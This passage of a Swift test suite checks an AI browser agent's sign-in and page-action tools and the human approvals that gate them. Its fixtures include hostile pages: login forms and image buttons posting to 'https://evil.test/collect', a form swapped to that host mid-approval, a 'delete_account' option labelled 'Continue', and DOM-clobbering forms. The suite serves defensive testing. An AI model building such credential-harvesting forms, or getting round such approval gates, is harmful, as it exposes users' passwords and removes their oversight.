            defer { window.close(); browser.windowClosed() }
            let store = StubLogins([("lab.test", Self.alice, Self.secret)]), confirmations = Confirmations()
            var answers: [String: ToolResult] = [:]
            try await signingIn(store, confirmations) {
                try await asking({ _ in .deny }) { _ in
                    answers["declined"] = await ToolCatalog.call("sign_in", ["tab_id": tab.id], caller: "mcp-a")
                    #expect(confirmations.reasons.isEmpty && store.passwordReads == 0)
                }
                // The user doesn't answer: the question times out as no.
                try await asking({ _ in .deny }) { stand in
                    stand.holds = true
                    let was = Approvals.timeout
                    Approvals.timeout = 0.3
                    defer { Approvals.timeout = was }
                    answers["timed out"] = await ToolCatalog.call("sign_in", ["tab_id": tab.id], caller: "mcp-b")
                }
                try await asking({ _ in .once }) { _ in
                    confirmations.answer = false
                    answers["unconfirmed"] = await ToolCatalog.call("sign_in", ["tab_id": tab.id], caller: "mcp-c")
                    #expect(confirmations.reasons.count == 1 && store.passwordReads == 0, "the password is not read before the device owner confirms")
                }
                // The question about using the page after reading another site is answered no.
                try await asking({ prompt in prompt.message.contains("sign in") ? .once : .deny }) { _ in
                    confirmations.answer = true
                    Approvals.noteRead(tab, readHost: "elsewhere.example", caller: "mcp-d")
                    answers["not allowed to use the page"] = await ToolCatalog.call("sign_in", ["tab_id": tab.id], caller: "mcp-d")
                }
            }
            #expect(await evaluate(tab, "return document.getElementById('u').value + document.getElementById('p').value") == "")
            // No login saved at all: a question that only says so is closed, and the answer is the same.
            try await signingIn(StubLogins([]), confirmations) {
                try await asking({ _ in .deny }) { stand in
                    answers["no login"] = await ToolCatalog.call("sign_in", ["tab_id": tab.id], caller: "mcp-e")
                    #expect(stand.asked.count == 1 && stand.asked[0].choices == [.deny])
                }
            }
            let reference = everything(ToolCatalog.signInNotDone)
            #expect(answers.count == 5)
            for (why, result) in answers {
                #expect(result.isError && everything(result) == reference, Comment(rawValue: "\(why): \(everything(result))"))
            }
        }

        @Test func withNoSavedLoginTheUserSeesAQuestionAndTheAIWaitsForItJustAsWithOne() async throws {
            let (tab, window, browser) = try await page(Self.loginForm, host: "lab.test")
            defer { window.close(); browser.windowClosed() }
            for (store, why) in [(StubLogins([]), "no login"), (StubLogins([("lab.test", Self.alice, Self.secret)]), "a login")] {
                try await signingIn(store) {
                    try await asking({ _ in .deny }) { stand in
                        stand.holds = true
                        let started = Date()
                        let answer = Task { @MainActor in await ToolCatalog.call("sign_in", ["tab_id": tab.id], caller: "mcp-wait-\(why)") }
                        #expect(await waitUntil { stand.asked.count == 1 }, "\(why): a question is shown")
                        try await Task.sleep(for: .milliseconds(400))
                        // Not answered until the user is done with the question, whether it offers a login or only says there is none.
                        Approvals.release(.deny)
                        let result = await answer.value
                        #expect(Date().timeIntervalSince(started) >= 0.4, "\(why): it waited for the user")
                        #expect(everything(result) == everything(ToolCatalog.signInNotDone), Comment(rawValue: "\(why): \(everything(result))"))
                    }
                }
            }
        }

        @Test func aSiteTheUserDeclinedIsNotAskedAgainInTheChatButTheAIWaitsTheSameAndThePanelSaysSo() async throws {
            let (tab, window, browser) = try await page(Self.loginForm, host: "lab.test")
            defer { window.close(); browser.windowClosed(); Approvals.forgetReads(caller: ChatStore.caller); ChatStore.shared.reset() }
            let was = SignIn.repeatDelay
            SignIn.repeatDelay = 0.6
            defer { SignIn.repeatDelay = was }
            let store = StubLogins([("lab.test", Self.alice, Self.secret)]), confirmations = Confirmations()
            let panel = ChatStore.caller
            try await signingIn(store, confirmations) {
                try await asking({ _ in .deny }) { stand in
                    let first = await ToolCatalog.call("sign_in", ["tab_id": tab.id], caller: panel)
                    #expect(stand.asked.count == 1 && everything(first) == everything(ToolCatalog.signInNotDone))
                    let started = Date()
                    let again = await ToolCatalog.call("sign_in", ["tab_id": tab.id], caller: panel)
                    #expect(stand.asked.count == 1, "no window again")
                    #expect(Date().timeIntervalSince(started) >= 0.6, "and not an instant answer, which would tell the AI something")
                    #expect(everything(again) == everything(ToolCatalog.signInNotDone))
                    #expect(ChatStore.shared.notice?.contains("lab.test") == true, "\(ChatStore.shared.notice ?? "no notice")")
                    // Another caller, and a new chat, are asked.
                    _ = await ToolCatalog.call("sign_in", ["tab_id": tab.id], caller: "mcp-other-chat")
                    #expect(stand.asked.count == 2)
                    Approvals.forgetReads(caller: panel)
                    _ = await ToolCatalog.call("sign_in", ["tab_id": tab.id], caller: panel)
                    #expect(stand.asked.count == 3)
                    // A stop during the wait ends it at once.
                    _ = await ToolCatalog.call("sign_in", ["tab_id": tab.id], caller: panel)
                    SignIn.repeatDelay = 30
                    let waiting = Task { @MainActor in await ToolCatalog.call("sign_in", ["tab_id": tab.id], caller: panel) }
                    try await Task.sleep(for: .milliseconds(200))
                    AgentActivity.shared.cancel(caller: panel)
                    let stopped = await waiting.value
                    #expect(stopped.isError && everything(stopped).contains("Stopped"), Comment(rawValue: everything(stopped)))
                }
            }
        }

        @Test func aFormWithAButtonThatSendsElsewhereOrChangesItsMindBeforeFillingGetsNoLogin() async throws {
            let store = StubLogins([("lab.test", Self.alice, Self.secret)]), confirmations = Confirmations()
            // A submit button with a formaction on another site.
            let sneaky = Self.loginForm.replacingOccurrences(of: "<button>Log in</button>", with: "<button>Log in</button><button formaction=\"https://evil.test/collect\">Other</button>")
            do {
                let (tab, window, browser) = try await page(sneaky, host: "lab.test")
                defer { window.close(); browser.windowClosed() }
                try await signingIn(store, confirmations) {
                    try await asking({ _ in .once }) { stand in
                        let result = await call(tab, "sign_in")
                        #expect(result.failed && result.text.contains("another site") && stand.asked.isEmpty && store.passwordReads == 0, Comment(rawValue: result.text))
                        #expect(await evaluate(tab, "return document.getElementById('u').value + document.getElementById('p').value") == "")
                    }
                }
            }
            // The form is changed while the user thinks.
            let (tab, window, browser) = try await page(Self.loginForm, host: "lab.test")
            defer { window.close(); browser.windowClosed() }
            try await signingIn(store, confirmations) {
                try await asking({ _ in .once }) { stand in
                    stand.holds = true
                    let answer = Task { @MainActor in await ToolCatalog.call("sign_in", ["tab_id": tab.id], caller: "mcp-swap") }
                    #expect(await waitUntil { stand.asked.count == 1 })
                    _ = await evaluate(tab, "document.querySelector('form').setAttribute('action', 'https://evil.test/collect'); return 'ok'")
                    Approvals.release(.once)
                    let result = await answer.value
                    #expect(everything(result) == everything(ToolCatalog.signInNotDone), Comment(rawValue: everything(result)))
                    #expect(await evaluate(tab, "return document.getElementById('u').value + document.getElementById('p').value") == "", "nothing was filled into a form that now sends elsewhere")
                    #expect(store.passwordReads == 1 && confirmations.reasons.count == 1, "the user had confirmed; the page then fails the check")
                }
            }
        }

        @Test func anImageButtonOutsideTheFormThatNamesItAndSendsElsewhereGetsNoLoginAndAsksWhenClicked() async throws {
            let html = """
                <body><form id=login action="/session" onsubmit="return false"><input id=u autocomplete=username><input id=p type=password></form>
                <input type=image form=login formaction="https://evil.test/collect" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" width=40 height=20 alt="Go" id=img></body>
                """
            let (tab, window, browser) = try await page(html, host: "lab.test")
            defer { window.close(); browser.windowClosed() }
            let store = StubLogins([("lab.test", Self.alice, Self.secret)])
            try await signingIn(store) {
                try await asking({ _ in .deny }) { stand in
                    let result = await call(tab, "sign_in")
                    #expect(result.failed && result.text.contains("another site") && stand.asked.isEmpty && store.passwordReads == 0, Comment(rawValue: result.text))
                    #expect(await evaluate(tab, "return document.getElementById('u').value + document.getElementById('p').value") == "")
                    // Clicking that button is asked about every time, as a form sent to another site.
                    let read = await call(tab, "read_page").text
                    let image = try #require(id(of: "Go", in: read), Comment(rawValue: read))
                    _ = await call(tab, "click", ["element_id": image])
                    #expect(stand.asked.contains { Self.isHigh($0) && $0.detail.contains("evil.test") }, "\(stand.asked.map(\.detail))")
                }
            }
        }

        @Test func fillingFiresFocusKeyupAndBlurSoThatAPagesButtonEnables() async throws {
            let html = """
                <body><form action="/session" onsubmit="return false"><input id=u autocomplete=username><input id=p type=password><button id=go disabled>Log in</button></form>
                <script>
                const seen = []; window.seen = seen;
                for (const id of ['u', 'p']) for (const t of ['focus', 'keyup', 'blur']) document.getElementById(id).addEventListener(t, () => seen.push(id + ':' + t));
                // This page enables its button only on keyup of the password field.
                document.getElementById('p').addEventListener('keyup', () => { document.getElementById('go').disabled = false });
                </script></body>
                """
            let (tab, window, browser) = try await page(html, host: "lab.test")
            defer { window.close(); browser.windowClosed() }
            try await signingIn(StubLogins([("lab.test", Self.alice, Self.secret)])) {
                try await asking({ _ in .once }) { _ in
                    let result = await call(tab, "sign_in")
                    #expect(!result.failed, Comment(rawValue: result.text))
                    #expect(await evaluate(tab, "return String(document.getElementById('go').disabled)") == "false", "the button enabled")
                    let seen = await evaluate(tab, "return seen.join(',')")
                    #expect(seen == "u:focus,u:keyup,u:blur,p:focus,p:keyup,p:blur", Comment(rawValue: seen))
                }
            }
        }

        @Test func anAccountWithNoUsernameIsNamedSoInTheQuestionAndThePicker() {
            #expect(Approvals.accountTitle("") == "(No username)")
            #expect(Approvals.accountTitle("alice") == "alice")
        }

        @Test func stoppingWithdrawsTheDeviceOwnersQuestionOfThatCaller() {
            SignIn.registerConfirmationForTesting(LAContext(), caller: "mcp-touch")
            SignIn.registerConfirmationForTesting(LAContext(), caller: "mcp-other-touch")
            let before = SignIn.waitingConfirmations
            AgentActivity.shared.cancel(caller: "mcp-touch")
            #expect(SignIn.waitingConfirmations == before - 1)
            AgentActivity.shared.cancel(caller: "mcp-other-touch")
        }

        @Test func withSeveralAccountsSavedTheUserPicksOneInTheQuestionAndTheAIIsNeverAskedOrToldWhich() async throws {
            let (tab, window, browser) = try await page(Self.loginForm, host: "lab.test")
            defer { window.close(); browser.windowClosed() }
            let store = StubLogins([("lab.test", "alice@example.com", "pw-alice"), ("lab.test", "bob@example.com", "pw-bob")])
            try await signingIn(store) {
                try await asking({ _ in .once }) { stand in
                    stand.pick = { _ in 1 }
                    // An account name given by the AI is not a parameter: it changes nothing.
                    let chosen = await ToolCatalog.call("sign_in", ["tab_id": tab.id, "account": "alice@example.com"], caller: "mcp-pick")
                    #expect(!chosen.isError && !everything(chosen).contains("bob") && !everything(chosen).contains("alice") && !everything(chosen).contains("pw-"), Comment(rawValue: everything(chosen)))
                    let question = try #require(stand.asked.first)
                    #expect(question.accounts == ["alice@example.com", "bob@example.com"] && question.message == "Let the AI sign in to lab.test?" && question.choices == [.deny, .once])
                    #expect(await evaluate(tab, "return document.getElementById('u').value + '/' + document.getElementById('p').value") == "bob@example.com/pw-bob", "the user's pick")
                    // Nothing picked: the first, the most recently used.
                    stand.pick = { _ in 0 }
                    _ = await ToolCatalog.call("sign_in", ["tab_id": tab.id], caller: "mcp-pick")
                    #expect(await evaluate(tab, "return document.getElementById('u').value") == "alice@example.com")
                    // A pick outside the list is the closest one in it; a no is a no whatever was picked.
                    stand.pick = { _ in 9 }
                    _ = await ToolCatalog.call("sign_in", ["tab_id": tab.id], caller: "mcp-pick")
                    #expect(await evaluate(tab, "return document.getElementById('u').value") == "bob@example.com")
                }
                try await asking({ _ in .deny }) { stand in
                    stand.pick = { _ in 1 }
                    let before = await evaluate(tab, "return document.getElementById('p').value")
                    let denied = await ToolCatalog.call("sign_in", ["tab_id": tab.id], caller: "mcp-pick-2")
                    #expect(everything(denied) == everything(ToolCatalog.signInNotDone) && store.passwordReads == 3)
                    #expect(await evaluate(tab, "return document.getElementById('p').value") == before)
                }
            }
            let properties = ToolCatalog.definitions.first { $0["name"] as? String == "sign_in" }.flatMap { ($0["inputSchema"] as? [String: Any])?["properties"] as? [String: Any] }
            #expect(Set(properties?.keys.map { $0 } ?? []) == ["element_id", "title", "tab_id"], "no account parameter")
        }

        @Test func signInRefusesAFormThatSendsToAnotherSiteAndAPageWithoutOne() async throws {
            let store = StubLogins([("lab.test", Self.alice, Self.secret)]), confirmations = Confirmations()
            let elsewhere = Self.loginForm.replacingOccurrences(of: "action=\"/session\"", with: "action=\"https://evil.test/collect\"")
            for (html, why) in [(elsewhere, "sends elsewhere"), ("<body><p>Nothing here</p><input placeholder=\"Search\"></body>", "no password field")] {
                let (tab, window, browser) = try await page(html, host: "lab.test")
                defer { window.close(); browser.windowClosed() }
                try await signingIn(store, confirmations) {
                    try await asking({ _ in .once }) { stand in
                        let result = await call(tab, "sign_in")
                        #expect(result.failed && stand.asked.isEmpty && store.passwordReads == 0 && confirmations.reasons.isEmpty, Comment(rawValue: "\(why): \(result.text)"))
                    }
                }
            }
        }

        @Test func signInRefusesAFrameWithNoSiteOfItsOwnEvenWhenThePageHasALogin() async throws {
            let inner = "<form><input placeholder='Frame user'><input type=password placeholder='Frame secret'></form>"
            let html = "<body><iframe sandbox='allow-scripts' style='width:300px;height:100px' srcdoc=\"\(inner)\"></iframe></body>"
            let (tab, window, browser) = try await page(html, host: "lab.test")
            defer { window.close(); browser.windowClosed() }
            let store = StubLogins([("lab.test", Self.alice, Self.secret)]), confirmations = Confirmations()
            try await signingIn(store, confirmations) {
                try await asking({ _ in .once }) { stand in
                    var read = ""
                    for _ in 0..<100 where !read.contains("Frame user") {
                        read = await call(tab, "read_page", caller: "mcp-frame").text
                        if !read.contains("Frame user") { try await Task.sleep(for: .milliseconds(50)) }
                    }
                    let field = try #require(id(of: "Frame user", in: read), Comment(rawValue: read))
                    stand.asked.removeAll()
                    let result = await call(tab, "sign_in", ["element_id": field], caller: "mcp-frame")
                    #expect(result.failed && result.text.contains("https"), Comment(rawValue: result.text))
                    #expect(stand.asked.isEmpty && confirmations.reasons.isEmpty && store.passwordReads == 0)
                }
            }
        }

        @Test func aLoginIsUsedOnlyForTheHostOfADocumentOnHttpsWithTheStandardPort() {
            #expect(SignIn.loginHost(ofOrigin: "https://lab.test") == "lab.test")
            #expect(SignIn.loginHost(ofOrigin: "https://Shop.Lab.Test") == "shop.lab.test", "a host is exact: two sites on one domain are two")
            #expect(SignIn.loginHost(ofOrigin: "https://xn--bcher-kva.example") == "xn--bcher-kva.example")
            for none in ["http://lab.test", "https://lab.test:8443", "null", "", "file://", "data:text/html,x", "https://[::1]", "about:blank", "ftp://lab.test"] {
                #expect(SignIn.loginHost(ofOrigin: none) == nil, "\(none)")
            }
        }

        @Test func aPointOfTheScreenIsClickedAndNamed() async throws {
            let (tab, window, browser) = try await page("<body style='margin:0'><button style='position:absolute;left:100px;top:50px;width:120px;height:40px' onclick=\"document.title='hit'\">Target</button></body>")
            defer { window.close(); browser.windowClosed() }
            let hit = await call(tab, "click_at", ["x": 150, "y": 70])
            #expect(!hit.failed && hit.text.contains("button \"Target\""))
            #expect(await waitUntil { tab.title == "hit" })
            let outside = await call(tab, "click_at", ["x": 99_999, "y": 70])
            #expect(outside.failed && outside.text.contains("outside"))
        }

        @Test func framesOfTheSameSiteAreReadAndUsed() async throws {
            let inner = "<button onclick=\"parent.document.title=&#39;inner clicked&#39;\">Inner Button</button><input placeholder=\"Inner field\">"
            let (tab, window, browser) = try await page("<body><iframe style='width:300px;height:100px' srcdoc='\(inner)'></iframe></body>")
            defer { window.close(); browser.windowClosed() }
            var read = ""
            for _ in 0..<100 where !read.contains("Inner Button") {
                read = await call(tab, "read_page").text
                if !read.contains("Inner Button") { try await Task.sleep(for: .milliseconds(50)) }
            }
            #expect(read.contains("\"Inner Button\"") && read.contains("(in a frame)"))
            let button = try #require(id(of: "Inner Button", in: read)), field = try #require(id(of: "Inner field", in: read))
            #expect(!(await call(tab, "type_text", ["element_id": field, "text": "hello"])).failed)
            #expect((await call(tab, "read_page")).text.contains("value=\"hello\""))
            #expect(!(await call(tab, "click", ["element_id": button])).failed)
            #expect(await waitUntil { tab.title == "inner clicked" })
        }

        @Test func aFrameWithNoSiteIsReachedThroughTheAppsOwnGreetingAndAlwaysAsked() async throws {
            let inner = "<button>Sandboxed Go</button>"
            let html = "<body><iframe sandbox='allow-scripts' style='width:300px;height:100px' srcdoc='\(inner)'></iframe></body>"
            let (tab, window, browser) = try await page(html, host: "outer.test")
            defer { window.close(); browser.windowClosed() }
            let panel = ChatStore.caller
            Approvals.forgetReads(caller: panel)
            defer { Approvals.forgetReads(caller: panel) }
            try await asking({ _ in .site }) { stand in
                var read = ""
                for _ in 0..<100 where !read.contains("Sandboxed Go") {
                    read = await call(tab, "read_page", caller: panel).text
                    if !read.contains("Sandboxed Go") { try await Task.sleep(for: .milliseconds(50)) }
                }
                #expect(read.contains("\"Sandboxed Go\"") && read.contains("(in a frame of another site)"), "\(read)")
                let button = try #require(id(of: "Sandboxed Go", in: read))
                // What it showed counts as read from a site of its own, so using it asks, and can't be allowed for the chat.
                for round in 1...2 {
                    let result = await call(tab, "click", ["element_id": button], caller: panel)
                    #expect(!result.failed, "\(result.text)")
                    #expect(stand.asked.filter { $0.message.contains("this page") }.count == round, "asked every time")
                }
                #expect(stand.asked.filter { $0.message.contains("this page") }.allSatisfy { $0.choices == [.deny, .once] })
            }
        }

        @Test func eachWayOfUsingAPageIsAskedOncePerSiteForTheChatAfterReadingAnother() async throws {
            let html = """
                <body><button id=b onclick="document.title='clicked'">Go</button><input id=i placeholder="Name"><div id=d draggable=true style="width:50px;height:20px">Drag</div><div id=z style="width:50px;height:20px">Zone</div></body>
                """
            let (tab, window, browser) = try await page(html, host: "lab.test")
            defer { window.close(); browser.windowClosed() }
            let panel = ChatStore.caller
            Approvals.forgetReads(caller: panel)
            defer { Approvals.forgetReads(caller: panel) }
            try await asking({ _ in .site }) { stand in
                var read = await call(tab, "read_page", caller: panel).text
                let go = try #require(id(of: "Go", in: read)), name = try #require(id(of: "Name", in: read)), drag = try #require(id(of: "Drag", in: read))
                let place = await evaluate(tab, "const r = document.getElementById('z').getBoundingClientRect(); return JSON.stringify([r.left + 5, r.top + 5])")
                let zone = try #require((try? JSONSerialization.jsonObject(with: Data(place.utf8))) as? [Double])
                func uses() -> Int { stand.asked.filter { $0.message.contains("lab.test") && !Self.isHigh($0) }.count }
                // Nothing read from another site yet: nothing to ask.
                #expect(!(await call(tab, "click", ["element_id": go], caller: panel)).failed && uses() == 0)
                // Another site was read.
                Approvals.noteRead(tab, readHost: "elsewhere.example", caller: panel)
                #expect(!(await call(tab, "click", ["element_id": go], caller: panel)).failed && uses() == 1)
                #expect(stand.asked.last?.choices == [.deny, .once, .site])
                // The site was allowed for the chat: every other way of using it goes through.
                #expect(!(await call(tab, "press_key", ["key": "Tab"], caller: panel)).failed)
                #expect(!(await call(tab, "hover", ["element_id": go], caller: panel)).failed)
                #expect(!(await call(tab, "drag", ["from_element_id": drag, "to_x": zone[0], "to_y": zone[1]], caller: panel)).failed)
                #expect(!(await call(tab, "type_text", ["element_id": name, "text": "Ann"], caller: panel)).failed)
                let atPoint = await call(tab, "click_at", ["x": 5, "y": 5], caller: panel)
                #expect(!atPoint.failed, Comment(rawValue: atPoint.text))
                #expect(uses() == 1, "once for the site")
                // Reading yet another site takes the allowance back.
                Approvals.noteRead(tab, readHost: "third.example", caller: panel)
                #expect(!(await call(tab, "hover", ["element_id": go], caller: panel)).failed && uses() == 2)
                // And scrolling is free whatever has been read.
                Approvals.noteRead(tab, readHost: "fourth.example", caller: panel)
                #expect(!(await call(tab, "scroll", ["direction": "down"], caller: panel)).failed && uses() == 2)
                read = await call(tab, "read_page", caller: panel).text
                #expect(uses() == 2, "reading is not using")
            }
        }

        @Test func stoppingWithAnApprovalPendingNeitherAnswersItNorRunsTheAction() async throws {
            let (tab, window, browser) = try await page(Self.form)
            defer { window.close(); browser.windowClosed() }
            let caller = "test-stop"
            try await asking({ _ in .once }) { stand in
                let read = await call(tab, "read_page", caller: caller).text
                let buy = try #require(id(of: "Buy now", in: read))
                stand.holds = true
                async let result = call(tab, "click", ["element_id": buy], caller: caller)
                #expect(await waitUntil { !guarded(stand).isEmpty })
                AgentActivity.shared.cancel(caller: caller)
                let answer = await result
                #expect(answer.failed && answer.text.contains("Stopped"), "\(answer.text)")
                // Even a yes that comes too late is for nobody.
                Approvals.release(.once)
                #expect(await evaluate(tab, "return document.title") != "bought")
                #expect(tab.title != "bought")
            }
        }

        @Test func stoppingBetweenTheTwoQuestionsOfOneClickStopsIt() async throws {
            let (tab, window, browser) = try await page(Self.form)
            defer { window.close(); browser.windowClosed() }
            let caller = "test-stop-2"
            Approvals.forgetReads(caller: caller)
            defer { Approvals.forgetReads(caller: caller) }
            try await asking({ _ in .once }) { stand in
                let read = await call(tab, "read_page", caller: caller).text
                let buy = try #require(id(of: "Buy now", in: read))
                // The user allows the use of the page; the call is stopped while the second question (the guard's) is open.
                Approvals.noteRead(tab, readHost: "elsewhere.example", caller: caller)
                stand.answer = { prompt in
                    if Self.isHigh(prompt) { AgentActivity.shared.cancel(caller: caller) }
                    return .once
                }
                let result = await call(tab, "click", ["element_id": buy], caller: caller)
                #expect(result.failed && result.text.contains("Stopped"), "\(result.text)")
                #expect(guarded(stand).count == 1)
                #expect(tab.title != "bought")
            }
        }

        @Test func twoReadsAtOnceDoNotMixUpTheNumbers() async throws {
            let (tab, window, browser) = try await page(Self.form)
            defer { window.close(); browser.windowClosed() }
            async let first = call(tab, "read_page")
            async let second = call(tab, "read_page")
            let (a, b) = await (first, second)
            #expect(!a.failed && !b.failed && a.text == b.text, "each read sees the same numbering")
            let cart = try #require(id(of: "Add to cart", in: b.text))
            #expect(!(await call(tab, "click", ["element_id": cart])).failed)
            #expect(await waitUntil { tab.title == "carted" })
        }

        @Test func aPageWithMoreElementsThanListedSaysSoInsteadOfPretendingTheRestIsUnreadable() async throws {
            let buttons = (0..<300).map { "<button>B\($0)</button>" }.joined()
            let (tab, window, browser) = try await page("<body>\(buttons)</body>")
            defer { window.close(); browser.windowClosed() }
            let read = await call(tab, "read_page").text
            #expect(read.contains("Only the first 250 elements are listed"), "\(read.prefix(300))")
            #expect(!read.contains("could not be read"))
            #expect(read.contains("[250] button") && !read.contains("[251] button"))
        }

        @Test func aLongButtonIsJudgedByAllItsWordsNotJustTheFirstOnes() async throws {
            let long = String(repeating: "I have read every word of the terms and conditions. ", count: 5) + "Place my order"
            let (tab, window, browser) = try await page("<body><button onclick=\"document.title='ordered'\">\(long)</button><a href=\"#\" onclick=\"document.title='read'\">\(long)</a></body>")
            defer { window.close(); browser.windowClosed() }
            try await asking({ _ in .deny }) { stand in
                let read = await call(tab, "read_page").text
                let button = try #require(read.split(separator: "\n").first { $0.contains("] button ") }.flatMap(number))
                let refused = await call(tab, "click", ["element_id": button])
                #expect(refused.failed && guarded(stand).count == 1)
                #expect(guarded(stand).first?.detail.contains("Place my order") == true)
                #expect(tab.title != "ordered")
                // A link round a card of text isn't named after every word in it.
                let link = try #require(read.split(separator: "\n").first { $0.contains("] a ") }.flatMap(number))
                #expect(!(await call(tab, "click", ["element_id": link])).failed && guarded(stand).count == 1)
            }
        }

        @Test func aFormThatClobbersItsOwnOwnerDocumentStillShowsWhereItGoes() async throws {
            let html = """
                <body><form action="/checkout" onsubmit="document.title='clobbered-sent';return false"><input name=ownerDocument placeholder="Own A"><input name=ownerDocument placeholder="Own B"></form>
                <form action="/checkout" onsubmit="document.title='base-sent';return false"><img name=baseURI width=1 height=1><input placeholder="Base"></form></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            try await asking({ _ in .deny }) { stand in
                let read = await call(tab, "read_page").text
                for label in ["Own A", "Base"] {
                    let before = guarded(stand).count
                    let result = await call(tab, "type_text", ["element_id": try #require(id(of: label, in: read)), "text": "x", "submit": true])
                    #expect(result.failed && guarded(stand).count == before + 1, "\(label): \(result.text)")
                }
                #expect(!["clobbered-sent", "base-sent"].contains(await evaluate(tab, "return document.title")))
            }
        }

        @Test func typingWithSubmitIntoAnythingInAPaymentFormIsJudgedLikeTheSubmissionItIs() async throws {
            let html = """
                <body><form action="/checkout" onsubmit="document.title='sent';return false">
                <input type=checkbox aria-label="Agree"><select aria-label="Size"><option>S</option><option>M</option></select><input type=button aria-label="Tick" value="tick" onclick="void 0"></form></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            try await asking({ _ in .deny }) { stand in
                let read = await call(tab, "read_page").text
                for (label, text) in [("Agree", "on"), ("Size", "M"), ("Tick", "x")] {
                    let before = guarded(stand).count
                    let result = await call(tab, "type_text", ["element_id": try #require(id(of: label, in: read)), "text": text, "submit": true])
                    #expect(result.failed && guarded(stand).count == before + 1, "\(label): \(result.text)")
                }
                #expect(tab.title != "sent")
            }
        }

        @Test func enterPressedInAMessageBoxIsAskedAboutLikeTypingItsWayThere() async throws {
            let html = """
                <body><textarea id=t placeholder="Message" onkeydown="if (event.key === 'Enter') { event.preventDefault(); document.title = 'sent' }"></textarea></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            try await asking({ _ in .deny }) { stand in
                let read = await call(tab, "read_page").text
                let area = try #require(id(of: "Message", in: read))
                #expect(!(await call(tab, "type_text", ["element_id": area, "text": "hello"])).failed && guarded(stand).isEmpty)
                let sent = await call(tab, "press_key", ["key": "Enter", "element_id": area])
                #expect(sent.failed && guarded(stand).count == 1 && tab.title != "sent")
                #expect(!(await call(tab, "press_key", ["key": "ArrowLeft"])).failed && guarded(stand).count == 1, "other keys are only keys")
            }
        }

        @Test func aNativeOptionIsJudgedByItsValueToo() async throws {
            let html = """
                <body><select aria-label="Plan" onchange="document.title='plan ' + this.value"><option value="delete_account">Continue</option><option value="stay">Stay</option></select></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            try await asking({ prompt in Self.isHigh(prompt) ? .deny : .once }) { stand in
                let read = await call(tab, "read_page").text
                let select = try #require(id(of: "Plan", in: read))
                let refused = await call(tab, "select_option", ["element_id": select, "option": "Continue"])
                #expect(refused.failed && guarded(stand).count == 1)
                #expect(tab.title != "plan delete_account")
                #expect(!(await call(tab, "select_option", ["element_id": select, "option": "Stay"])).failed && guarded(stand).count == 1)
            }
        }

        @Test func aNativeListThatSubmitsItsFormWhenChangedTakesTheFormsCardAlong() async throws {
            let html = """
                <body><form action="/next" onsubmit="document.title='submitted';return false"><input autocomplete="cc-number" placeholder="Card">
                <select aria-label="Size" onchange="this.form.requestSubmit()"><option>Small</option><option>Large</option></select>
                <select aria-label="Colour"><option>Red</option><option>Blue</option></select></form></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            try await asking({ prompt in Self.isHigh(prompt) ? .deny : .once }) { stand in
                let read = await call(tab, "read_page").text
                let size = try #require(id(of: "Size", in: read)), colour = try #require(id(of: "Colour", in: read))
                let refused = await call(tab, "select_option", ["element_id": size, "option": "Large"])
                #expect(refused.failed && guarded(stand).count == 1 && tab.title != "submitted")
                // Whether a page makes a list submit its form can't always be seen (a listener, the form's own handler): in a form
                // that asks for card details, any list is taken to.
                let other = await call(tab, "select_option", ["element_id": colour, "option": "Blue"])
                #expect(other.failed && guarded(stand).count == 2 && tab.title != "submitted", "\(other.text)")
            }
        }

        @Test func aNativeListInAFormThatIsOnlyAFormIsOnlyAListButItsOptionsAreStillJudgedByName() async throws {
            let html = """
                <body><form action="/search"><select aria-label="Colour"><option>Red</option><option>Blue</option><option>Delete all</option></select>
                <select aria-label="Shipping"><option value="delete_account">Express</option><option value="ground">Ground</option></select></form>
                <form action="/checkout/pay"><select aria-label="Quantity"><option>1</option><option>2</option></select></form>
                <select aria-label="Loose"><option>Red</option></select></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            try await asking({ prompt in Self.isHigh(prompt) ? .deny : .once }) { stand in
                let read = await call(tab, "read_page").text
                let colour = try #require(id(of: "Colour", in: read)), shipping = try #require(id(of: "Shipping", in: read))
                let quantity = try #require(id(of: "Quantity", in: read)), loose = try #require(id(of: "Loose", in: read))
                #expect(!(await call(tab, "select_option", ["element_id": colour, "option": "Blue"])).failed && guarded(stand).isEmpty, "an ordinary option of an ordinary form")
                #expect((await call(tab, "select_option", ["element_id": colour, "option": "Delete all"])).failed && guarded(stand).count == 1, "its name is judged though the form is not submitted by it")
                #expect((await call(tab, "select_option", ["element_id": shipping, "option": "Express"])).failed && guarded(stand).count == 2, "and so is its value")
                #expect((await call(tab, "select_option", ["element_id": quantity, "option": "2"])).failed && guarded(stand).count == 3, "a list in a form that posts to a checkout")
                #expect(!(await call(tab, "select_option", ["element_id": loose, "option": "Red"])).failed && guarded(stand).count == 3)
            }
        }

        @Test func theNamesOfAControlAreFingerprintedWhole() async throws {
            let padding = String(repeating: "x", count: 1500)
            let html = "<body><button id=b aria-label=\"\(padding)A\">Menu</button><a id=l href=\"#top\">Go</a></body>"
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            let view = try #require(tab.webView)
            func facts() async -> [String: Any] {
                let text = await ToolCatalog.run(PageScripts.lib + "\nreturn JSON.stringify(factsOf(document.getElementById('b'), {}));", [:], in: view).content.first?["text"] as? String ?? ""
                return (try? JSONSerialization.jsonObject(with: Data(text.utf8)) as? [String: Any]) ?? [:]
            }
            let before = await facts()
            _ = await evaluate(tab, "document.getElementById('b').setAttribute('aria-label', '\(padding)B'); return 1")
            let after = await facts()
            #expect((before["fp"] as? String)?.count == 64 && before["fp"] as? String != after["fp"] as? String, "a change a thousand characters in is a change")
            _ = await evaluate(tab, "document.getElementById('b').setAttribute('aria-label', '\(padding) pay'); return 1")
            let named = (await facts())["names"] as? [String] ?? []
            let judgedFacts = IrreversibleAction.Facts(await facts())
            #expect(named.contains { $0.hasSuffix(" pay") } && IrreversibleAction.tier(of: judgedFacts) == .high, "a word past a thousand characters of a name is judged")
            let hint = await ToolCatalog.run(PageScripts.lib + "\nreturn [digest(''), digest('abc'), digest('a'.repeat(1000))].join(' ');", [:], in: view).content.first?["text"] as? String
